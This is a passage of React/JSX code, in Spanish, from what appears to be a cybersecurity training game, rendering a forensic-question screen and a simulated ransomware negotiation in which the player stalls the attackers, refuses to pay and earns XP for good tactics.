            <div style={{ fontSize: '13px', fontWeight: 700, color: C.violet, marginBottom: '10px' }}>{evidencias[evidenciaActual].titulo}</div>
            <pre style={{ fontSize: '12px', color: '#94a3b8', lineHeight: '1.8', whiteSpace: 'pre-wrap', fontFamily: 'monospace', margin: 0 }}>{evidencias[evidenciaActual].contenido}</pre>
          </div>
          <div style={{ background: 'rgba(168,85,247,0.08)', border: '1px solid rgba(168,85,247,0.2)', borderRadius: '10px', padding: '14px' }}>
            <div style={{ fontSize: '12px', color: C.violet, fontWeight: 700, marginBottom: '6px' }}>🔎 HALLAZGO</div>
            <div style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.6' }}>{evidencias[evidenciaActual].pista}</div>
          </div>
        </div>

        {/* PREGUNTAS */}
        <div style={{ overflowY: 'auto', padding: '24px' }}>
          <div style={{ fontSize: '14px', fontWeight: 700, color: C.cyan, letterSpacing: '2px', marginBottom: '6px' }}>❓ PREGUNTAS FORENSES</div>
          <div style={{ fontSize: '12px', color: '#64748b', marginBottom: '20px' }}>Pregunta {preguntaActual + 1} de {preguntasForenses.length}</div>

          <div style={{ background: C.card, border: `1px solid ${C.border}`, borderRadius: '12px', padding: '20px', marginBottom: '20px' }}>
            <div style={{ fontSize: '16px', fontWeight: 700, color: 'white', lineHeight: '1.5' }}>{preguntasForenses[preguntaActual].pregunta}</div>
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', marginBottom: '20px' }}>
            {preguntasForenses[preguntaActual].opciones.map(op => (
              <div key={op.id} onClick={() => elegirForense(op)}
                style={{ padding: '14px 16px', borderRadius: '10px', border: `2px solid ${respuestaForense ? (op.correcto ? '#4ade80' : '#f87171') : C.border}`, background: respuestaForense ? (op.correcto ? 'rgba(74,222,128,0.08)' : 'rgba(248,113,113,0.04)') : C.card, cursor: respuestaForense ? 'default' : 'pointer' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: respuestaForense ? '6px' : '0' }}>
                  <span style={{ fontSize: '14px', color: '#e2e8f0' }}>{op.texto}</span>
                  {respuestaForense && <span>{op.correcto ? '✅' : '❌'}</span>}
                </div>
                {respuestaForense && <div style={{ fontSize: '12px', color: '#94a3b8' }}>{op.razon}</div>}
              </div>
            ))}
          </div>

          {respuestaForense && (
            <button onClick={siguienteForense} style={{ padding: '14px 28px', borderRadius: '10px', border: 'none', background: `linear-gradient(to right, ${C.cyan}, ${C.violet})`, color: '#080b18', fontSize: '15px', fontWeight: 700, cursor: 'pointer', fontFamily: 'inherit' }}>
              {preguntaActual + 1 >= preguntasForenses.length ? 'Pasar a negociación →' : 'Siguiente pregunta →'}
            </button>
          )}
        </div>
      </div>
    </div>
  )

  // ===== FASE 2: NEGOCIACIÓN =====
  if (fase === 2) return (
    <div style={{ minHeight: '100vh', background: C.bg, color: '#e2e8f0', fontFamily: 'system-ui, sans-serif', fontSize: '15px', display: 'flex', flexDirection: 'column' }}>
      <header style={{ height: '64px', background: C.sidebar, borderBottom: `1px solid ${C.border}`, display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 28px' }}>
        <div>
          <div style={{ fontSize: '11px', color: '#f87171', letterSpacing: '2px', fontWeight: 700 }}>FASE 3/3 — NEGOCIACIÓN</div>
          <div style={{ fontSize: '17px', fontWeight: 700, color: 'white' }}>Negociación con el Atacante</div>
        </div>
        <div style={{ fontSize: '17px', fontWeight: 700, color: '#fbbf24' }}>⚡ {score1 + score2 + score3} XP</div>
      </header>

      <div style={{ display: 'grid', gridTemplateColumns: '260px 1fr 280px', flex: 1, overflow: 'hidden' }}>

        {/* INFO */}
        <div style={{ background: C.sidebar, borderRight: `1px solid ${C.border}`, padding: '24px', overflowY: 'auto' }}>
          <div style={{ fontSize: '13px', fontWeight: 700, color: '#f87171', marginBottom: '12px' }}>⚠ SITUACIÓN</div>
          <p style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.7', marginBottom: '20px' }}>
            El grupo Phantom tiene datos cifrados de la empresa. Debes negociar para ganar tiempo mientras IT restaura desde backups.
          </p>
          <div style={{ background: C.card, border: `1px solid ${C.border}`, borderRadius: '10px', padding: '14px', marginBottom: '16px' }}>
            <div style={{ fontSize: '12px', color: '#64748b', marginBottom: '8px' }}>OBJETIVO</div>
            <div style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.6' }}>
              Ganar tiempo, no pagar, y obtener información del atacante para las autoridades.
            </div>
          </div>
          <div style={{ background: 'rgba(248,113,113,0.06)', border: '1px solid rgba(248,113,113,0.2)', borderRadius: '10px', padding: '14px' }}>
            <div style={{ fontSize: '12px', color: '#f87171', fontWeight: 700, marginBottom: '6px' }}>❌ NUNCA</div>
            <div style={{ fontSize: '12px', color: '#94a3b8', lineHeight: '1.6' }}>
              · Confirmar que pagarás<br />
              · Dar información interna<br />
              · Mostrar urgencia o pánico<br />
              · Revelar el estado del backup
            </div>
          </div>
        </div>

        {/* CHAT */}
        <div style={{ display: 'flex', flexDirection: 'column', borderRight: `1px solid ${C.border}` }}>
          <div style={{ padding: '14px 24px', background: C.card, borderBottom: `1px solid ${C.border}`, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <div style={{ width: '36px', height: '36px', borderRadius: '50%', background: 'rgba(248,113,113,0.2)', border: '2px solid #f87171', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '16px' }}>💀</div>
              <div>
                <div style={{ fontSize: '14px', fontWeight: 700, color: '#f87171' }}>Grupo Phantom</div>
                <div style={{ fontSize: '11px', color: '#64748b' }}>Canal cifrado — Tor Network</div>
              </div>
            </div>
            <div style={{ fontSize: '12px', color: '#64748b', fontFamily: 'monospace' }}>🔒 CIFRADO</div>
          </div>

          <div ref={chatRef} style={{ flex: 1, overflowY: 'auto', padding: '20px 24px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
            {mensajesNeg.map((msg, i) => (
              <div key={i} style={{ display: 'flex', justifyContent: msg.de === 'yo' ? 'flex-end' : 'flex-start', gap: '10px', alignItems: 'flex-end' }}>
                {msg.de !== 'yo' && (
                  <div style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(248,113,113,0.2)', border: '1px solid #f87171', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '14px', flexShrink: 0 }}>💀</div>
                )}
                <div style={{ maxWidth: '75%', background: msg.de === 'yo' ? `${C.violet}33` : 'rgba(248,113,113,0.08)', border: `1px solid ${msg.de === 'yo' ? C.violet + '44' : '#f8717133'}`, borderRadius: msg.de === 'yo' ? '16px 16px 4px 16px' : '16px 16px 16px 4px', padding: '12px 16px' }}>
                  <div style={{ fontSize: '14px', color: '#e2e8f0', lineHeight: '1.6' }}>{msg.texto}</div>
                </div>
                {msg.de === 'yo' && (
                  <div style={{ width: '30px', height: '30px', borderRadius: '50%', background: `${C.violet}33`, border: `1px solid ${C.violet}44`, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '14px', flexShrink: 0 }}>🕵️</div>
                )}
              </div>
            ))}
          </div>

          {!negFinished && mensajesNeg.length >= 4 && !respuestaNeg && (
            <div style={{ padding: '16px 24px', borderTop: `1px solid ${C.border}`, background: C.sidebar }}>
              <div style={{ fontSize: '11px', color: '#64748b', letterSpacing: '2px', marginBottom: '10px' }}>ELIGE TU RESPUESTA:</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                {opcionesActuales.map(op => (
                  <button key={op.id} onClick={() => elegirNeg(op)}
                    style={{ padding: '12px 16px', borderRadius: '10px', border: `1px solid ${C.border}`, background: C.card, color: '#e2e8f0', fontSize: '14px', cursor: 'pointer', fontFamily: 'inherit', textAlign: 'left' }}>
                    {op.texto}
                  </button>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* ANÁLISIS */}
        <div style={{ background: C.sidebar, overflowY: 'auto', padding: '20px' }}>
          <div style={{ fontSize: '13px', fontWeight: 700, color: C.cyan, letterSpacing: '2px', marginBottom: '16px' }}>📊 ANÁLISIS EN TIEMPO REAL</div>

          {!respuestaNeg && mensajesNeg.length < 4 && (
            <div style={{ padding: '14px', background: 'rgba(255,255,255,0.03)', border: `1px solid ${C.border}`, borderRadius: '10px', fontSize: '13px', color: '#64748b', textAlign: 'center' }}>
              Escucha al atacante...<br />El análisis aparecerá pronto
            </div>
          )}

          {mensajesNeg.length >= 2 && (
            <div style={{ background: 'rgba(251,191,36,0.08)', border: '1px solid rgba(251,191,36,0.2)', borderRadius: '10px', padding: '12px', marginBottom: '8px', fontSize: '12px', color: '#fbbf24' }}>
              💡 El atacante menciona 24 horas — están bajo presión de tiempo también.
            </div>
          )}
          {mensajesNeg.length >= 3 && (
            <div style={{ background: 'rgba(251,191,36,0.08)', border: '1px solid rgba(251,191,36,0.2)', borderRadius: '10px', padding: '12px', marginBottom: '8px', fontSize: '12px', color: '#fbbf24' }}>
              💡 Piden prueba de vida — significa que esperan que la verifiques.
            </div>
          )}

          {respuestaNeg && (
            <div style={{ background: respuestaNeg.tipo === 'bueno' ? 'rgba(74,222,128,0.08)' : respuestaNeg.tipo === 'malo' ? 'rgba(248,113,113,0.08)' : 'rgba(251,191,36,0.08)', border: `1px solid ${respuestaNeg.tipo === 'bueno' ? '#4ade8044' : respuestaNeg.tipo === 'malo' ? '#f8717144' : '#fbbf2444'}`, borderRadius: '10px', padding: '14px', marginBottom: '10px' }}>
              <div style={{ fontSize: '13px', fontWeight: 700, color: respuestaNeg.tipo === 'bueno' ? '#4ade80' : respuestaNeg.tipo === 'malo' ? '#f87171' : '#fbbf24', marginBottom: '6px' }}>
                {respuestaNeg.tipo === 'bueno' ? '✅ Buena táctica' : respuestaNeg.tipo === 'malo' ? '❌ Táctica incorrecta' : '⚠ Táctica neutral'}
              </div>
              <div style={{ fontSize: '12px', color: '#94a3b8' }}>{respuestaNeg.razon}</div>
              <div style={{ fontSize: '13px', fontWeight: 700, color: '#fbbf24', marginTop: '8px' }}>{respuestaNeg.xp > 0 ? `+${respuestaNeg.xp} XP` : `${respuestaNeg.xp} XP`}</div>
            </div>
          )}

          <div style={{ marginTop: '16px', background: `${C.violet}0f`, border: `1px solid ${C.violet}33`, borderRadius: '10px', padding: '14px' }}>
            <div style={{ fontSize: '12px', color: C.violet, fontWeight: 700, marginBottom: '6px' }}>🎯 RECUERDA</div>
            <div style={{ fontSize: '12px', color: '#94a3b8', lineHeight: '1.6' }}>
              Cada minuto que ganas es tiempo para que IT restaure los backups. No muestres urgencia.
            </div>
          </div>
        </div>
      </div>
    </div>
  )

  return null
}